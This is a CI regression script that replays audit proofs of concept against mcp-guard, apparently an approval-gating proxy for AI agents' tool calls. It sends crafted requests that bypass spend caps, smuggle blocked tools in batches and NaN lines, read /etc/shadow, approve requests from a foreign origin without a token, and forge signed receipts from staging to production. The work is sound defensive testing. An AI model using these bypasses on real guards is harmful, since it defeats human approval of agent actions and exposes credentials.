#!/usr/bin/env node
/**
 * Black-box replay of the October 2026 audit proofs of concept against a built
 * mcp-guard checkout (argv[2] = its root). Used by CI against the pre-fix commit
 * 1480615 (every attack must SUCCEED) and the current code (every attack must be
 * STOPPED), so the evidence for the fix is re-proven on every run.
 *
 *   node scripts/audit-poc.mjs <root> --expect vulnerable|fixed
 *
 * Exit 0 when every result matches the expectation, 1 otherwise.
 */
import { spawn, execFileSync } from 'node:child_process';
import { readFileSync, writeFileSync, existsSync, mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { createRequire } from 'node:module';
import crypto from 'node:crypto';

const ROOT = resolve(process.argv[2] ?? '.');
const expectIdx = process.argv.indexOf('--expect');
const EXPECT = expectIdx > 0 ? process.argv[expectIdx + 1] : null;
if (EXPECT !== 'vulnerable' && EXPECT !== 'fixed') {
  console.error('usage: node scripts/audit-poc.mjs <root> --expect vulnerable|fixed');
  process.exit(2);
}
const require = createRequire(join(ROOT, 'package.json'));
const isNew = existsSync(join(ROOT, 'dist/src/frame.js'));
// 0.3 signs the org receipt standard with keys created only by `mcp-guard keys init`.
const isJcs = existsSync(join(ROOT, 'dist/src/keystore.js'));
const dir = mkdtempSync(join(tmpdir(), 'mcp-guard-audit-'));
const LOG = join(dir, 'exec.log');
const PORT = 7900 + Math.floor(Math.random() * 90);
const TOKEN = crypto.randomBytes(32).toString('hex');
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

writeFileSync(join(dir, 'echo.mjs'), `import{createInterface}from'node:readline';import{appendFileSync}from'node:fs';createInterface({input:process.stdin}).on('line',l=>{appendFileSync(${JSON.stringify(LOG)},l+'\\n');try{const m=JSON.parse(l);if(!Array.isArray(m)&&m.id!=null)process.stdout.write(JSON.stringify({jsonrpc:'2.0',id:m.id,result:{ok:true}})+'\\n')}catch{}})`);
// The pre-fix loader has no amount_arg; the fixed loader requires it. Same policy otherwise.
writeFileSync(join(dir, 'cfg.yaml'), `default_action: block
mode: enforce
rules:
  - { id: spend, tool: spend, action: require_approval, reversibility: reversible, cap_usd: 50${isNew ? ', amount_arg: amount' : ''} }
  - { id: nope, tool: nope, action: block }
`);

const env = { ...process.env, PP_KEYS_DIR: join(dir, 'keys'), PP_SHARED_RECEIPTS_PATH: join(dir, 'r.jsonl'), PP_WEBHOOK_SECRET: 's3cret', PP_APPROVAL_TOKEN: TOKEN };
if (isJcs) execFileSync('node', [join(ROOT, 'dist/src/cli.js'), 'keys', 'init'], { env, stdio: 'ignore' });
const g = spawn('node', [join(ROOT, 'dist/src/cli.js'), '--config', join(dir, 'cfg.yaml'), '--approval-port', String(PORT), '--', 'node', join(dir, 'echo.mjs')], { cwd: dir, env, stdio: ['pipe', 'pipe', 'ignore'] });
const send = (s) => g.stdin.write(s + '\n');
const base = `http://127.0.0.1:${PORT}`;
for (let i = 0; i < 50; i++) { try { await fetch(base + '/'); break; } catch { await sleep(100); } }

send(JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'spend', arguments: { amount: 25000, payee: 'attacker', _pp: { amount_usd: 1 } } } }));
send(JSON.stringify([{ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'nope', arguments: {} } }]));
send('{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"nope","arguments":{"x":NaN}}}');
send(JSON.stringify({ jsonrpc: '2.0', id: 4, method: 'resources/read', params: { uri: 'file:///etc/shadow' } }));
await sleep(600);

const log = existsSync(LOG) ? readFileSync(LOG, 'utf8') : '';
const results = [];
const record = (name, succeeded) => results.push({ name, succeeded });
record('F2 spend-cap bypass via _pp.amount_usd reaches the server', log.includes('"id":1'));
record('F5 batch with a blocked tool reaches the server', log.includes('[{'));
record('F5 non-JSON (NaN) line with a blocked tool reaches the server', log.includes('NaN'));
record('F8 resources/read under default_action block reaches the server', log.includes('resources/read'));

const hmac = (b) => 'sha256=' + crypto.createHmac('sha256', 's3cret').update(b).digest('hex');
const pr = (n) => JSON.stringify({ action: 'labeled', repository: { full_name: 'o/r' }, pull_request: { number: n, title: 't', head: { sha: 'abc' }, labels: [{ name: 'needs-authority' }] } });
const q = await (await fetch(`${base}/api/github/webhook`, { method: 'POST', body: pr(7), headers: { 'x-hub-signature-256': hmac(pr(7)) } })).json();
const evilRead = await fetch(`${base}/api/pending`, { headers: { Origin: 'https://evil.example' } });
record('F1 a foreign origin can read the pending queue', evilRead.status === 200 && evilRead.headers.get('access-control-allow-origin') === '*');
const evilApprove = await fetch(`${base}/api/approve/${q.id}`, { method: 'POST', headers: { Origin: 'https://evil.example' } });
record('F1 a foreign origin can approve without a token', evilApprove.status === 200);
const q2 = await (await fetch(`${base}/api/github/webhook`, { method: 'POST', body: pr(8), headers: { 'x-hub-signature-256': hmac(pr(8)) } })).json();
const H = { Authorization: `Bearer ${TOKEN}` };
await fetch(`${base}/api/deny/${q2.id}`, { method: 'POST', headers: H });
const late = await fetch(`${base}/api/approve/${q2.id}`, { method: 'POST', headers: H });
record('F6 a denied PR can be approved afterwards', late.status === 200);
g.kill();

// F3: a signed staging approval re-split into a production receipt.
process.env.PP_KEYS_DIR = join(dir, 'keys-f3');
if (isJcs) {
  const { createKey } = require(join(ROOT, 'dist/src/keystore.js'));
  const { Issuer } = require(join(ROOT, 'dist/src/issuer.js'));
  const { verifyArtifactReceipt } = require(join(ROOT, 'dist/src/receipt-verify.js'));
  const key = createKey();
  const config = { mode: 'enforce', signing: 'required', server_label: 's', policy_sha256: 'p', receipt_ttl_seconds: 900, scoped_receipt_ttl_seconds: 900 };
  const issued = new Issuer({ config, agentId: 'a' }).issue({
    method: 'tools/call', tool: 'deploy', input: { env: 'staging', sha: 'x.scope=deploy:production' }, status: 'APPROVED', ruleId: 'deploy',
    reasonCodes: ['OPERATOR_APPROVED'], decider: { kind: 'operator', operator: 'rod' },
    scope: { scope: 'deploy:staging', scope_sha: 'x.scope=deploy:production.scope_ref=refs/heads/main.scope_sha=GOODSHA' },
  });
  // Re-split the signed scope into production and re-encode the payload.
  const payload = JSON.parse(Buffer.from(issued.artifact.payload_bytes_b64, 'base64').toString('utf8'));
  const req = JSON.parse(payload.requestJson);
  req.scope = { capability: 'deploy:production', ref: 'refs/heads/main', commitSha: 'GOODSHA' };
  payload.requestJson = JSON.stringify(req);
  const forged = { ...issued.artifact, payload_bytes_b64: Buffer.from(JSON.stringify(payload)).toString('base64') };
  const res = verifyArtifactReceipt({ artifact: forged }, key.keySet, { trust: new Map([[key.keyId, key.fingerprint]]), expected: { scope: 'deploy:production', scope_ref: 'refs/heads/main', scope_sha: 'GOODSHA' } });
  record('F3 a staging approval re-split into deploy:production verifies', res.valid);
} else if (isNew) {
  const { issueReceipt } = require(join(ROOT, 'dist/src/receipt.js'));
  const { verifyReceipt } = require(join(ROOT, 'dist/src/receipt-verify.js'));
  const { currentKeyId, getPublicKeyPem } = require(join(ROOT, 'dist/src/signer.js'));
  const r = issueReceipt({ method: 'tools/call', tool: 'deploy', args: { env: 'staging', sha: 'x.scope=deploy:production' }, decision: { decision: 'allowed', rule_id: 'deploy', reason: 'r' }, approval: { kind: 'human', id: 'rod', via: 'local-token' }, actor: 'a', mode: 'enforce', policy_sha256: 'p', ttl_seconds: 900, target_server: 's', scope: { scope: 'deploy:staging', scope_sha: 'x.scope=deploy:production.scope_ref=refs/heads/main.scope_sha=GOODSHA' } });
  const f = JSON.parse(JSON.stringify(r));
  f.envelope.scope = { scope: 'deploy:production', ref: 'refs/heads/main', sha: 'GOODSHA' };
  record('F3 a staging approval re-split into deploy:production verifies', verifyReceipt(f, { [currentKeyId()]: getPublicKeyPem() }, { expected: { scope: 'deploy:production', scope_ref: 'refs/heads/main', scope_sha: 'GOODSHA' } }).valid);
} else {
  const { createReceipt, signReceipt } = require(join(ROOT, 'dist/src/receipt.js'));
  const { verifyReceiptOffline } = require(join(ROOT, 'dist/src/receipt-verify.js'));
  const { getPublicKeyPem } = require(join(ROOT, 'dist/src/signer.js'));
  const { deriveScope } = require(join(ROOT, 'dist/src/proxy.js'));
  const args = { env: 'staging', sha: 'x.scope=deploy:production.scope_ref=refs/heads/main.scope_sha=GOODSHA' };
  const r = createReceipt('a', 'deploy', { decision: 'held_for_approval', rule_id: 'deploy', reason: 'r' }, args, 's', 'enforce', deriveScope('deploy', args));
  signReceipt(r, 'human');
  const f = structuredClone(r);
  f.request_payload_hash = `${r.request_payload_hash}.scope=${r.scope}.scope_ref=.scope_sha=x`;
  f.scope = 'deploy:production'; f.scope_ref = 'refs/heads/main'; f.scope_sha = 'GOODSHA';
  record('F3 a staging approval re-split into deploy:production verifies', verifyReceiptOffline(f, getPublicKeyPem(), { scope: 'deploy:production', scope_ref: 'refs/heads/main', scope_sha: 'GOODSHA' }).valid);
}

let ok = true;
for (const r of results) {
  const want = EXPECT === 'vulnerable';
  const pass = r.succeeded === want;
  if (!pass) ok = false;
  console.log(`${pass ? 'ok  ' : 'FAIL'} ${r.succeeded ? 'SUCCEEDED' : 'STOPPED  '}  ${r.name}`);
}
console.log(`\n${ROOT}: expected every attack to be ${EXPECT === 'vulnerable' ? 'SUCCEEDED (pre-fix baseline)' : 'STOPPED (current code)'}: ${ok ? 'yes' : 'NO'}`);
process.exit(ok ? 0 : 1);
